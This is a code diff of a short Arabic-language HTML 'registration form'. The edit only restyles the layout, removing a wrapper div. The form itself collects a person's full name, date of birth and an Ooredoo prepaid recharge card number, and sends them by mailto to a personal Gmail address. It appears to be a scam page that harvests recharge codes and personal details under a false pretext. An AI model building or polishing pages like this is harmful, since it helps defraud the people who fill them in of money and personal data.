@@ -10,19 +10,13 @@
       background-position: center;
       margin: 0;
       padding: 0;
-    }
-
-    form {
-      width: 100%;
       height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 20px;
-      box-sizing: border-box;
     }
 
-    .form-wrapper {
+    form {
       width: 80%;
       max-width: 500px;
       background: rgba(255, 255, 255, 0.7);
@@ -68,19 +62,17 @@
 <body>
 
   <form action="mailto:wided.mee@gmail.com" method="post" enctype="text/plain">
-    <div class="form-wrapper">
-      <h2>نموذج التسجيل</h2>
-      <label for="fullName">الاسم واللقب:</label>
-      <input type="text" id="fullName" name="fullName"><br><br>
-      
-      <label for="dob">تاريخ الولادة:</label>
-      <input type="text" id="dob" name="dob"><br><br>
-      
-      <label for="ooredooCard">بطاقة شحن Ooredoo:</label>
-      <input type="text" id="ooredooCard" name="ooredooCard"><br><br>
-      
-      <input type="submit" value="إرسال">
-    </div>
+    <h2>نموذج التسجيل</h2>
+    <label for="fullName">الاسم واللقب:</label>
+    <input type="text" id="fullName" name="fullName"><br><br>
+    
+    <label for="dob">تاريخ الولادة:</label>
+    <input type="text" id="dob" name="dob"><br><br>
+    
+    <label for="ooredooCard">بطاقة شحن Ooredoo:</label>
+    <input type="text" id="ooredooCard" name="ooredooCard"><br><br>
+    
+    <input type="submit" value="إرسال">
   </form>
 
 </body>
